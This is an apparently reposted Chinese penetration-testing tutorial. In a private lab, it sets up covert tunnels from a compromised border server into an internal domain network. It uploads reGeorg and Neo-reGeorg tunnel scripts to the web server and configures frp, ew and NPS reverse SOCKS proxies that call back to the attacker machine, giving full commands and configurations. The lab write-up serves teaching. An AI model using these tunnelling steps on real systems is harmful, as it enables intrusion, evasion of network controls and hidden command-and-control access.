<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ns_QT9-fogBlU7l5jHY_gw)

**别低头，皇冠会掉；别流泪，贱人会笑。**

**本文首发于先知社区，原创作者即是本人**

0x00 前言
=======

构建内网隐蔽通道，从而突破各种安全策略限制，实现对目标服务器的完美控制。  
当我们从外网成功获得攻击点的时候，通过反弹 shell、端口转发、内网穿透等技巧，来进一步入侵内网服务器。当我们取得内网目标服务器的控制权限，通过隧道技术绕过网络限制，实现隐蔽 C2 服务器的通信。

网络拓扑：

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VDkxh3iaJNWMVic5dWic9U0O0iaTxftRufPTK7S4Q1yl2ZuPCMoAAicp9d2A/640?wx_fmt=png&from=appmsg)

网络配置 IP 如下：

```
攻击机：
win10：192.168.1.6
kali：192.168.1.7

靶场：
VM1：对外边界服务器，win7
192.168.52.143
192.168.1.5

VM2：域成员，2003
192.168.52.141

VM3：域控，2008
192.168.52.138

```

0x01 reGeorge
=============

1.1 环境
------

攻击机 kalireGeorge 软件，下载：https://github.com/sensepost/reGeorg 运行程序需要的环境：Python、pip、urllib3；

1.2 部署配置
--------

上传 tunnel.nosocket.php 前提条件，已获得跳板机的权限（都打到内网了，跳板机的权限肯定获得了），server-bt 系统的跳板机是 php 环境，将 reGeorge 中的 tunnel.nosocket.php 上传至网站

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9V0nuLEqWIPhOHDOKO2Sy7PiaAA56c3Sib4zicEy4Xib1m8oBNZoNzBIg43g/640?wx_fmt=png&from=appmsg)

并访问 http://192.168.1.5/tunnel.nosocket.php 访问成功

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VRJtm1t8BKYIoLbBKIQ8YoY9JwbRyfoCWQKx2ohDmj6CXscVJ4EyzPg/640?wx_fmt=png&from=appmsg)

启动 reGeorgpython reGeorgSocksProxy.py -p 1090 -u http://192.168.1.5/tunnel.nosocket.php 表示本地 1090 端口的流量都转发给指定的那个 url，1090 是指定的监听端口；

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VLYv6k20od8jEegn7QmNyxNAiazBia7iba1qfMuG5KpgSK55FRwdbvdQEw/640?wx_fmt=png&from=appmsg)

配置代理然后配置 proxychains 代理链的配置文件 vim /etc/proxychains.conf，将代理设置成本机的 1090 端口：socks5 127.0.0.1 1090

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9V6gTP5ia4P5ImQmlxD8sDiaLn6uHwKYKBEP5sOg3eGmyP9PWpRXfWudibw/640?wx_fmt=png&from=appmsg)

1.3 测试
------

命令前面加上 proxychains 运行命令，（跳板机 php 环境已启动，存在主页 index.php）proxychains curl http://192.168.52.143

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VJ2mrMdfLwPIPXfYTnPFtVsTIaG0pZ2iavCUAr7qKppRrFDAuorT2UuA/640?wx_fmt=png&from=appmsg)

reGeorg 控制端

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VF08gWn0jQ0yVgn4O3JVzKyuakMu95sX86zAicvjiavgwMibGOibyg8ZTPQ/640?wx_fmt=png&from=appmsg)

0x02 Neo-reGeorg
================

1.1 使用
------

设置密码并生成隧道文件，运行后会生成一个 neoreg_server 目录，里面包含了各种语言类型的隧道文件

```
$ python3 neoreg.py generate -k <password>
[+] Create neoreg server files:
  => neoreg_server/key.txt.   # 密码
  => neoreg_server/tunnel.nosocket.php
  => neoreg_server/tunnel.js
  => neoreg_server/tunnel.php
  => neoreg_server/tunnel.ashx
  => neoreg_server/tunnel.aspx
  => neoreg_server/tunnel.tomcat.5.jsp
  => neoreg_server/tunnel.tomcat.5.jspx
  => neoreg_server/tunnel.jsp
  => neoreg_server/tunnel.jspx

```

python3 neoreg.py generate -k jdxyxd

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9V8jFSZPm64ibg3R12g2aW7paGAN31e9YgE2nSIkWlksPPibda9YnwlshA/640?wx_fmt=png&from=appmsg)

1.2 部署配置
--------

上传 tunnel.php 前提条件，已获得跳板机的权限（都打到内网了，跳板机的权限肯定获得了），server-bt 系统的跳板机是 php 环境，将 reGeorge 中的 tunnel.php 上传至网站

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VEib30cFYZBCZed2YgliaDqt7dyBco32PuBIfDCGqbs73VSdJ9tKEWTCg/640?wx_fmt=png&from=appmsg)

并访问 http://192.168.1.5/tunnel.php 访问成功

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9Vl4lYKGjuOjnYoiaLfc25eew1zGdmf3bxaNdeRb66IiabYLbbBUsUwiaSw/640?wx_fmt=png&from=appmsg)

启动 Neo-reGeorgpython3 neoreg.py -k jdxyxd -u http://192.168.1.5/tunnel.php #表示本地 1080 端口的流量都转发给指定的那个 url，1080 是指定的监听端口；

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VLDIPD6cyY1oAXYt5SyPJm1JBj4rh7nuib5wsKZ110ibicqYatwK2TZ72g/640?wx_fmt=png&from=appmsg)

配置代理然后配置 proxychains 代理链的配置文件 vim /etc/proxychains.conf，将代理设置成本机的 1080 端口：socks5 127.0.0.1 1080

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9V7h5SerKreUbEAEKbr8jd7lCIQFH5NT7OjviamxwNELgkYb9k52lFCng/640?wx_fmt=png&from=appmsg)

1.3 测试
------

命令前面加上 proxychains 运行命令，（跳板机 php 环境已启动，存在主页 index.php）proxychains curl http://192.168.52.143

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VSib63jM5Kpqah9qpwhibeOicavnicIibQzjtJ3SLCcmicAyK2lqOvVdOcseQ/640?wx_fmt=png&from=appmsg)

0x03 frp
========

软件：frp_0.33.0_windows_amd64 ，frp_0.34.1_linux_amd64 代理工具 Proxifier（windows 下通常用可视化的 proxifier、SocksCap64，Linux 在 proxychains 设置）

1.1 攻击机为 windows 环境
-------------------

frp 的 Socks5 反向代理：(HTTP 反向代理修改 plugin 模块和 proxifier 代理类型即可) 攻击机 - 服务端：设置 frps.ini

```
[common]
bind_port = 7000

```

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VDpagDxQyib8fuXM7AgoqF0BgNZ7yVSfiaJIjzk6ia95FCY5XGAAmAylQA/640?wx_fmt=png&from=appmsg)

然后运行 frps.exe -c frps.ini

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VTOAbPeTstfSlRMTW7ZRVwkuXvwAXDtkyTz8515hOO8Nadw4PCLZAUQ/640?wx_fmt=png&from=appmsg)

跳板机 - 客户端：server_addr 为攻击机 IP 设置 frpc.ini

```
[common]
server_addr = 192.168.1.6
server_port = 7000

[socks5]
type = tcp
remote_port = 8010
plugin = socks5

```

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VU3nMn684BXyMOIs59uUicyiaF2F7AN9kiadExibOJUwHsWQBccvnxn98DQ/640?wx_fmt=png&from=appmsg)

然后运行 frpc.exe -c frpc.ini

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9V2cSia01pkVWJicziaz5GiaBEcUGVJiamJ9dZcgnOgm7mYdk1qU6EqM7U3XQ/640?wx_fmt=png&from=appmsg)

SwitchyOmega 配置

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9V9iaNwLY9EAjAiajLI1nOmjpz5BosWvUubtEhBxFejdN62Hght8acIV7Q/640?wx_fmt=png&from=appmsg)

浏览器访问 192.168.52.143 访问成功

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VWsDibB9eiaiaoibzV6FcdnZQUxIQJto4bQsB2VpAbXzibSNzgeRX28ED8TQ/640?wx_fmt=png&from=appmsg)

proxifier 配置

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VNaELz3icvMNEfG4K8BgREFNf8JBbiaSPTDmPbT8TYgAWgQ2JsicAY0gZA/640?wx_fmt=png&from=appmsg)

浏览器访问 192.168.52.143 访问成功

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VPJqUGDGWrIJUJG6gps150ot9LcI00Cg1IwCs2icaImzc5ickkjJoKekg/640?wx_fmt=png&from=appmsg)

0x04 ew
=======

1.1 攻击机为 kali 环境
----------------

ew 正向代理
-------

1. 正向连接跳板机在 win7 机器上执行 (ew_for_windows 上传到跳板机)ew_for_win_32.exe -s ssocksd -l 1090

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VKPDs5CzqGXFS2kz2pTXYYsGSJzXjeX7805SyT3aPLUbXQV4Glv729g/640?wx_fmt=png&from=appmsg)

这里还需要修改 proxychains.conf 配置文件 $ vim /etc/proxychains.conf socks5 192.168.1.5 1090

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VyAFgLcatPr7NwoAm2pwJ3icPJrqxWyia9uzLLswbpO2GsAA08ulhwt6Q/640?wx_fmt=png&from=appmsg)

测试执行：proxychains curl http://192.168.52.143/

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VtO1jMYeRqQB1dPibCSbNeBtV1PTbxicTYH37wnTibVBtfCfhGkFUaibh3w/640?wx_fmt=png&from=appmsg)

ew 反向代理
-------

服务端 - 攻击机 kali 执行：./ew_for_linux -s rcsocks -l 1080 -e 1024

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9Vn25aLH6AcL4icXMYNZDgMhZCtnBwia8ktwP8fHoYbNvJibbh1prHicRwBw/640?wx_fmt=png&from=appmsg)

客户端 - 跳板机执行 ew.exe -s rssocks -d 192.168.1.7 -e 1024

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VdKgxBr1Nx7kYe49ZdvUFban6kfjVmVPRU8Libbib91dPlSia8iaDpdy07w/640?wx_fmt=png&from=appmsg)

配置 proxychains 代理链在配置文件 / etc/proxychains.conf，将代理设置成本机的 1080 端口 (root 用户修改)：

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VApsnqgLPia2BSUZ5SJjjMRykMichBJtlyVicy90tnRNLRXQh4j0Np6cyQ/640?wx_fmt=png&from=appmsg)

测试执行：proxychains curl http://192.168.52.143/

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VDXZeFdwiaYXTiaDKkB2cpqdnQqNaxUnicqM4wtHNDWBLicnYwOtHY7u5Gw/640?wx_fmt=png&from=appmsg)

0x05 NPS 隐秘隧道搭建
===============

1）建立连接
------

此场景攻击机使用 Kali，在攻击机运行命令 “./nps install” 安装服务端，如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VWU4LtWGpqnvBQ8ICbIMvDzjjVt0levwjRyyU3h8lbMENXsCM7G1KkA/640?wx_fmt=png&from=appmsg)

运行命令 “nps start” 启动服务端，如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VSSmOg5knp3KwDScv7vHgicNevurIM6COtEKrT1HicAHhf2LHyZb9KwXA/640?wx_fmt=png&from=appmsg)

通过 8080 端口访问服务端的 Web 界面，如图所示。

http://192.168.1.7:8080

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9V5YrzPXDRicCmJdVCSicRDk2x63Bd7etxz4XEBY1DLKZavFFSCqKRuMfQ/640?wx_fmt=png&from=appmsg)

输入默认用户名、密码 admin、123 登录，登录后可以看到默认客户端连接端口为 8024，登录后的 Web 界面如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9Vf09UhpFmMG6Jyr0GDs4KaNYicEkR8Eg75Gyb1kPwvWph0bFK1Ykic4qA/640?wx_fmt=png&from=appmsg)

添加客户端，如图所示，配置唯一验证密钥，验证密钥在从客户端连接到服务端时使用，此处配置为 “any”，然后开启压缩和加密传输。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VCTcYCoj2jNDBEFjctMjaOnPmzZIZ7E4hbmWPoB9HpbRqD15dDlWVZQ/640?wx_fmt=png&from=appmsg)

最后在边界主机运行命令 “npc.exe -server=192.168.1.7:8024 -vkey=any” 来连接服务端，建立连接如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VPVsucMl1pdIybpiaXh2gibVX4CcyLSXaWhNYHsicWEUqicY12dgq9AZQuA/640?wx_fmt=png&from=appmsg)

连接成功后在攻击机的 Web 界面可看到客户端上线，如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VI7DPywukpqh5ynYzpQUGC22KQsoh7uVebXZ2hiaMEQTib32QmxxK8O8A/640?wx_fmt=png&from=appmsg)

2）TCP 隧道
--------

客户端上线后便可以通过 Web 界面单击上线的客户端、查看选项、配置隧道，例如，若想访问内网主机的 3389 端口，则可通过 TCP 隧道将内网主机的 3389 端口映射到攻击机的 1111 端口，单击 “新增”，配置目标 “192.168.52.143:3389”，配置服务端口为 “1111”，TCP 隧道如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VMO3fr7OIEgxSAPsfW2H3w9z2BWEiaRf4W4HH8icyIu8B0H2pNaYDicctw/640?wx_fmt=png&from=appmsg)

TCP 隧道建立成功后，即可通过连接攻击机的 1111 端口来连接内网主机的远程桌面，在攻击机运行命令 “rdesktop 192.168.1.7:1111” 连接本地的 1111 端口，隧道的使用如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VQHOs5TnVt1G7hSE2Bp5OrEu9hBoZMDl6qMSaibVybkd28QD1PxVsNTA/640?wx_fmt=png&from=appmsg)

3）SOCKS5 代理
-----------

若想搭建 HTTP 代理或 SOCKS 代理，只需选择对应模式，填写服务端端口即可，以 SOCKS 为例，选择模式为 “SOCKS 代理”，如图所示，服务端端口为 “1234”。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VctibWIgpl3sgNW9DJyOk3qFFKY8qicbCFLS8WJ3vzosuKnzR9icVtdYMg/640?wx_fmt=png&from=appmsg)

配置好 SOCKS 代理后，便可使用攻击机 192.168.1.7 的 1234 端口访问内网，配置代理服务器

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VFvXV87Hvf1M8qiaKHEgVgEVoAkAMjSnibkquqejWQZICwriaictpwcDKVA/640?wx_fmt=png&from=appmsg)

访问内网主机站点 http://192.168.52.143/ 使用代理如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9ViagmiagD35slLgusfHH2qPtcYHiarRrkE3yfTH1DZxZzBPfl0ibZVwZqcg/640?wx_fmt=png&from=appmsg)

或者配置 proxifier

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VZmvLfjlsmrphibP19Dyq3wFLeC1jFSI6febjyLSqjh6FIZicYaoGoYzA/640?wx_fmt=png&from=appmsg)

访问内网主机站点 http://192.168.52.143/

![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwjud5icibyJLcvV13tqsicJ9VxEBXiaMNK9gmHiaNTB4x8nibHucpdqnrfH4ERDzo062X1j2ffpyyccP3A/640?wx_fmt=png&from=appmsg)

文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。

免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。

转载声明：各家兴 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。

```
CSDN:
https://blog.csdn.net/weixin_48899364?type=blog

公众号：
https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect

博客:
https://rdyx0.github.io/

先知社区：
https://xz.aliyun.com/u/37846

SecIN:
https://www.sec-in.com/author/3097

FreeBuf：
https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85



```